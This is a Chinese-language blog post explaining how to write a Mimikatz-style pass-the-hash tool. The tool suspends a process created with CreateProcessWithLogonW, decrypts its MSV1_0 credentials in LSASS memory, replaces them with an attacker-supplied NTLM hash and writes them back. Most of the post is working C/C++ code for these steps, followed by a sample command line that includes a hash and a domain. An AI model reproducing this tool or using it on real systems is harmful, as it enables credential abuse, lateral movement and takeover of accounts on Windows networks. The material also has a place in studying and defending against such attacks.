---
title: Sekurlsa - 如何滥用 CreateProcessWithLogonW 函数实现哈希传递
date: 2023-02-08 23:26:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Windows", "Lsass"]
layout: post
---

# 0. 基础知识

哈希传递（Pass The Hash，PTH）是一种针对 NTLM 协议的攻击技术。当攻击者获得有效的用户名和哈希值后，就能够对远程主机进行身份认证，无需暴力破解明文密码即可获取该主机权限。该方法直接取代了窃取用户明文密码和暴力破解哈希值的需要，在内网渗透中十分经典。

Windows 身份验证的核心原则是用户仅在交互式登录期间输入一次凭据，成功验证安全主体凭据后，身份验证包可以将凭据信息与登录会话相关联后缓存在 LSASS 中，以便执行后续身份验证请求。然后在非交互身份验证期间，用户不会输入登录数据，而是使用以前建立的凭据。

并且，Windows 系统中的每个进程都有一个与之关联的访问令牌，此访问令牌将进程与特定登录会话相关联。除此之外，访问令牌还包括一个名为 “AuthenticationID” 的本地唯一标识符 (LUID) 值，用于将缓存在 LSASS 中的网络身份验证凭证映射到特定的登录会话。LUID 是一个 64 位值，意味着在生成它的系统上是唯一的。

哈希传递背后的想法是修改进程映射到 LSASS 中的身份验证凭据，以使用攻击者控制的哈希代替当前用户的哈希来对网络资源进行身份验证。最终，攻击者利用指定的用户哈希在不知道明文密码的情况下对远程主机执行身份验证。这也是 Mimikatz 对哈希传递的实现思路，主要步骤如下：

1. 使用 `CreateProcessWithLogonW()` 函数创建一个进程，并指定 `CREATE_SUSPENDED` 创建标志使创建的进程处于挂起状态。
2. 通过 `OpenProcessToken()` 函数打开与第 1 步中进程关联的访问令牌，并使用 `GetTokenInformation()` 函数检索访问令牌的统计信息，在统计信息中获取 `AuthenticationID` 值，该值指定分配给此令牌代表的登录会话的 LUID。
3. 枚举 LSASS 进程信息，主要枚举 `LogonSessionList` 链表中的登录会话，并从 `h3DesKey`、`hAesKey` 和 `InitializationVector` 中提取 BCrypt 密钥和初始化向量，具体方法可以参考 ”MSV“ 节中的描述。
4. 根据第 2 步中的 `AuthenticationID` 找到与该进程的访问令牌相关联的登录会话，并从会话信息中找到加密的凭据结构。
5. 使用第 3 步提取的密钥和初始化向量对该进程的关联凭据结构进行解密，并将其中的 NTLM 哈希替换为攻击者控制的 NTLM 哈希。
6. 使用第 3 步提取的密钥和初始化向量对替换后的凭据结构重新加密，重新写入 LSASS 进程，覆盖原来的凭据。
7. 恢复开始时挂起的进程，该进程将使用新的凭据信息进行网络身份验证，至此完成哈希传递攻击。

下面笔者参考 Mimikatz 的代码，通过 C/C++ 编写一个名为 PassTheHash 的工具，用来实现哈希传递攻击。由于篇幅限制仅描述关键代码部分，相关头文件定义以及各个函数的定义位置请读者自行实现。此外，本节的大部分代码与 ”MSV1_0“ 节的相同，在此笔者只从主要的变化点开始讲解。

# 1. 编写主函数	

PassTheHash 的主函数定义如下。主函数启动后，首先通过 `RtlGetNtVersionNumbers()` 函数获取操作系统版本，并使用 `EnableDebugPrivilege()` 函数提升进程令牌特权。

```c++
int wmain(int argc, wchar_t* argv[])
{
	HANDLE hToken = NULL;
	LPCWSTR lpUsername, lpDomain, lpNtlm, lpCommandLine;

	RtlGetNtVersionNumbers(&NT_MAJOR_VERSION, &NT_MINOR_VERSION, &NT_BUILD_NUMBER);

	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken))
	{
		wprintf(L"[-] OpenProcessToken error [%u].\n", GetLasterror());
		return -1;
	}

	if (EnableDebugPrivilege(hToken, SE_DEBUG_NAME))
	{
		if (GetArgsByName(argc, argv, L"user", &lpUsername, NULL))
		{
			wprintf(L"[*] User Name      : %s\n", lpUsername);
			if (GetArgsByName(argc, argv, L"domain", &lpDomain, NULL))
			{
				wprintf(L"[*] Domain         : %s\n", lpDomain);
				if (GetArgsByName(argc, argv, L"ntlm", &lpNtlm, NULL))
				{
					if (GetArgsByName(argc, argv, L"run", &lpCommandLine, L"cmd.exe"))
					{
						wprintf(L"[*] Program to run : %s\n", lpCommandLine);
						PassTheHash(lpUsername, lpDomain, (LPWSTR)lpCommandLine, lpNtlm);
					}
				}
				else wprintf(L"[-] Missing argument : ntlm\n");
			}
			else wprintf(L"[-] Missing argument : domain\n");
		}
		else wprintf(L"[-] Missing argument : user\n");
	}
}
```

然后调用自定义函数 `GetArgsByName()` 获取命令行参数，包括用户名、域名、NTLM 哈希值以及要运行的程序。最后进入 `PassTheHash()` 函数开始执行哈希传递。

# 2. 启动哈希传递

## 2.1 创建挂起进程

编写 `PassTheHash()` 函数，如下所示。

```c++
BOOL PassTheHash(LPCWSTR lpUsername, LPCWSTR lpDomain, LPWSTR lpCommandLine, LPCWSTR lpNtlm)
{
	BOOL status = FALSE;
	BYTE ntlm[LM_NTLM_HASH_LENGTH];
	TOKEN_STATISTICS tokenStatistics;
	LSA_PTH_DATA pthData = { NULL, NULL, FALSE };
	STARTUPINFO startupInfos;
	RtlZeroMemory(&startupInfos, sizeof(STARTUPINFO));
	startupInfos.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION processInformations;
	HANDLE hToken;
	DWORD ReturnLength;

	if (StringToHex(lpNtlm, ntlm, LM_NTLM_HASH_LENGTH))
	{
		pthData.NtlmHash = ntlm;
		wprintf(L"[*] NTLM\t   : ");
		PrintfHex(pthData.NtlmHash, LM_NTLM_HASH_LENGTH);
		wprintf(L"\n");
	}
	else wprintf(L"[-] Ntlm hash/rc4 key is incorrect\n");

	if (pthData.NtlmHash)
	{
		if (lpUsername)
		{
			if (CreateProcessWithLogonW(lpUsername, lpDomain, L"", LOGON_NETCREDENTIALS_ONLY, NULL, lpCommandLine, CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &startupInfos, &processInformations))
			{
				wprintf(L"      |  PID  %u\n      |  TID  %u\n", processInformations.dwProcessId, processInformations.dwThreadId);
				if (OpenProcessToken(processInformations.hProcess, TOKEN_READ, &hToken))
				{
					if (GetTokenInformation(hToken, TokenStatistics, &tokenStatistics, sizeof(tokenStatistics), &ReturnLength) && (pthData.LogonId = &tokenStatistics.AuthenticationId))
					{
						wprintf(L"      |  LogonId  %u:%u (%08x:%08x)\n", pthData.LogonId->HighPart, pthData.LogonId->LowPart, pthData.LogonId->HighPart, pthData.LogonId->LowPart);
						status = EnumerateLSA(&pthData);
						
						if (status && pthData.isReplaceOk)
						{
							status = NT_SUCCESS(NtResumeProcess(processInformations.hProcess));
						}
						else NtTerminateProcess(processInformations.hProcess, STATUS_PROCESS_IS_TERMINATING);
					}
					else wprintf(L"[-] GetTokenInformation error");
					CloseHandle(hToken);
				}
				else wprintf(L"[-] OpenProcessToken error");
				CloseHandle(processInformations.hThread);
				CloseHandle(processInformations.hProcess);
			}
			else wprintf(L"[-] CreateProcessWithLogonW error");
		}
	}
	return status;
}
```

在该函数内部，首先定义了一个名为 `pthData` 变量，这是一个 `LSA_PTH_DATA` 结构体，用于存储后续哈希传递需要用到的数据，其定义如下。

```c++
typedef struct _LSA_PTH_DATA {
	PLUID		LogonId;
	LPBYTE		NtlmHash;
	BOOL		isReplaceOk;
} LSA_PTH_DATA, * PLSA_PTH_DATA;
```

接着，将命令行中获取到的 NTLM 值调用 `StringToHex()` 函数，将其从字符串转换为 BYTE 格式，并保存到 `pthData.NtlmHash` 中。

如果设置了 `lpUsername` 参数，则使用 `CreateProcessWithLogonW()` 函数启动一个新的 `cmd.exe` 进程，并指定 `CREATE_SUSPENDED` 创建标志使该进程处于挂起状态。`processInformations` 变量用于接收新进程的标识信息，包括进程的句柄。

调用 `OpenProcessToken()` 函数打开新进程的访问令牌的句柄，并使用 `GetTokenInformation()` 函数检索访问令牌的统计信息，在统计信息中获取 `AuthenticationID` 值保存到 `pthData.LogonId` 中，该值指定分配给此令牌代表的登录会话的 LUID。

然后进入 `EnumerateLSA()`，开始复杂的 LSA 信息枚举，包括枚举 `LogonSessionList` 链表中的用户登录会话信息以及提取 BCrypt 密钥和初始化向量，具体方法与 ”MSV“ 节中的完全相同，因此不再赘述。唯一不同的是，枚举完 LSA 信息后，由 `EnumerateLSA()` 函数调用 `Msv1_0Pth()` 函数，如下所示。

```c++
BOOL EnumerateLSA(PLSA_PTH_DATA pPthData)
{
	// ...

	status = AcquireLSA();

	if (status)
	{
		// ...

		Msv1_0Pth(&sessionData, pPthData);

		// ...
	}
	return status;
}
```

`Msv1_0Pth()` 函数定义如下，其通过将新进程的 `AuthenticationID` 与枚举 LSA 得到的会话信息中的 `LogonId` 进行比较，从而找到与该进程的访问令牌相关联的登录会话，并对会话信息中找到加密的凭据结构调用 `Msv1_0EnumerateCreds()` 函数。

```c++
void Msv1_0Pth(PBASIC_SECURITY_LOGON_SESSION_DATA pData, PLSA_PTH_DATA pPthData)
{
	MSV1_0_PTH_DATA_CRED pthDataCred = { pData, pPthData };
	if (SecEqualLuid(pData->LogonId, pPthData->LogonId))
	{
		wprintf(L"      \\_ MSV1_0  -  ");
		Msv1_0EnumerateCreds(pData->pCredentials, &pthDataCred);
	}
}
```

## 2.2 处理用户凭据结构

编写 `Msv1_0EnumerateCreds()` 函数，如下所示。

```c++
BOOL Msv1_0EnumerateCreds(PVOID pCredentials, PMSV1_0_PTH_DATA_CRED pthDataCred)
{
	BOOL status = FALSE;
	MSV1_0_CREDENTIALS credentials;
	MSV1_0_PRIMARY_CREDENTIALS primaryCredentials;
	MEMORY_ADDRESS lsassMemory = { pCredentials };

	while (lsassMemory.address)
	{
		if (ReadProcessMemory(cLsass.hProcess, lsassMemory.address, &credentials, sizeof(MSV1_0_CREDENTIALS), NULL))
		{
			while (lsassMemory.address)
			{
				lsassMemory.address = credentials.PrimaryCredentials;
				while (lsassMemory.address)
				{
					if (ReadProcessMemory(cLsass.hProcess, lsassMemory.address, &primaryCredentials, sizeof(MSV1_0_PRIMARY_CREDENTIALS), NULL))
					{
						PVOID pOriginBufferAddress = primaryCredentials.Credentials.Buffer;
						if (GetUnicodeString(&primaryCredentials.Credentials, cLsass.hProcess))
						{
							if (GetUnicodeString((PUNICODE_STRING)&primaryCredentials.Primary, cLsass.hProcess))
							{
								status = Msv1_0CredsPth(&primaryCredentials, pOriginBufferAddress, pthDataCred);
								LocalFree(primaryCredentials.Primary.Buffer);
							}
							LocalFree(primaryCredentials.Credentials.Buffer);
						}
					}
					else
						wprintf(L"[-] MSV1_0_PRIMARY_CREDENTIALS No.\n");
					lsassMemory.address = primaryCredentials.next;
				}
			}
			lsassMemory.address = credentials.next;
		}
		else
			wprintf(L"[-] MSV1_0_CREDENTIALS No.\n");
	}
	return status;
}
```

其与 ”MSV“ 节中稍有不同的是，经过几次 `ReadProcessMemory()` 调用后，将获取到主要凭据，并将其传入自定义函数 `Msv1_0CredsPth()`。其中 `pOriginBufferAddress` 变量保存了加密凭据的原始地址。

## 2.3 覆盖用户原始凭据

编写  `Msv1_0CredsPth()` 函数，如下所示。

```c++
BOOL Msv1_0CredsPth(PMSV1_0_PRIMARY_CREDENTIALS pCredentials, PVOID pOriginBufferAddress, PMSV1_0_PTH_DATA_CRED pthDataCred)
{
	BOOL status = FALSE;
	PBYTE msvCredentials;
	const MSV1_0_PRIMARY_HELPER* pMSVHelper;

	if (cLsass.osContext.BuildNumber < WIN_BUILD_10_1507)
		pMSVHelper = &MSV1_0_PrimaryHelper[0];
	else if (cLsass.osContext.BuildNumber < WIN_BUILD_10_1511)
		pMSVHelper = &MSV1_0_PrimaryHelper[1];
	else if (cLsass.osContext.BuildNumber < WIN_BUILD_10_1607)
		pMSVHelper = &MSV1_0_PrimaryHelper[2];
	else
		pMSVHelper = &MSV1_0_PrimaryHelper[3];
	
	if (msvCredentials = (PBYTE)pCredentials->Credentials.Buffer)
	{
		if (LsaUnprotectMemory(msvCredentials, pCredentials->Credentials.Length))
		{
			*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisLmOwfPassword) = FALSE;
			*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisShaOwPassword) = FALSE;

			if(pMSVHelper->offsetToisIso)
				*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisIso) = FALSE;

			if (pMSVHelper->offsetToisDPAPIProtected)
			{
				*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisDPAPIProtected) = FALSE;
				RtlZeroMemory(msvCredentials + pMSVHelper->offsetToDPAPIProtected, LM_NTLM_HASH_LENGTH);
			}

			RtlZeroMemory(msvCredentials + pMSVHelper->offsetToLmOwfPassword, LM_NTLM_HASH_LENGTH);
			RtlZeroMemory(msvCredentials + pMSVHelper->offsetToShaOwPassword, SHA_DIGEST_LENGTH);

			if (pthDataCred->pPthData->NtlmHash)
			{
				*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisNtOwfPassword) = TRUE;
				RtlCopyMemory(msvCredentials + pMSVHelper->offsetToNtOwfPassword, pthDataCred->pPthData->NtlmHash, LM_NTLM_HASH_LENGTH);
			}
			else
			{
				*(PBOOLEAN)(msvCredentials + pMSVHelper->offsetToisNtOwfPassword) = FALSE;
				RtlZeroMemory(msvCredentials + pMSVHelper->offsetToNtOwfPassword, LM_NTLM_HASH_LENGTH);
			}
			
			if (LsaProtectMemory(msvCredentials, pCredentials->Credentials.Length))
			{
				wprintf(L"data copy @ %p\n", pOriginBufferAddress);
				if(pthDataCred->pPthData->isReplaceOk = WriteProcessMemory(cLsass.hProcess, pOriginBufferAddress, msvCredentials, pCredentials->Credentials.Length, NULL))
					wprintf(L"      \\_ OK!\n");
				else
					wprintf(L"      \\_ WriteProcessMemory error!\n");
				
			}
		}
	}
	status = pthDataCred->pPthData->isReplaceOk;
	return status;
}
```

在  `Msv1_0CredsPth()` 函数中，我们先调用 `LsaUnprotectMemory()` 函数解密原始凭据，然后对解密后的凭证进行修改、替换，例如将 LM、SHA 以及 DPAPI 保护属性设置为 FALSE，内容用 0 填充，表明凭证不包含这些哈希值。`isNtOwfPassword` 属性设置为 TRUE，表明凭证中存在 NTLM 哈希，`NtOwfPassword` 设置为被替换的 NTLM 值。

接着，使用 `LsaProtectMemory()` 函数对修改、替换后的凭证做加密处理，并通过 `WriteProcessMemory()` 函数将其写入 LSASS 进程的原始地址中，覆盖其原有凭证。

至此，成功修改了与新进程关联的凭据。

## 2.4 恢复挂起的进程

最后，返回 `PassTheHash()` 函数中，调用 `NtResumeProcess()` 函数恢复开始时挂起的进程，该进程将使用新的凭据信息进行网络身份验证，至此完成哈希传递攻击。

# 4. 运行效果演示

以管理员权限运行 PassTheHash，即执行哈希传递，如下图所示。

```powershell
PassTheHash.exe /user:Administrator /domain:pentest.com /ntlm:570a9a65db8fba761c1008a51d4c95ab /run:cmd.exe
```

![image-20230127221059232](/assets/posts/2023-02-08-how-to-pass-the-hash-by-yourself//image-20230127221059232.png)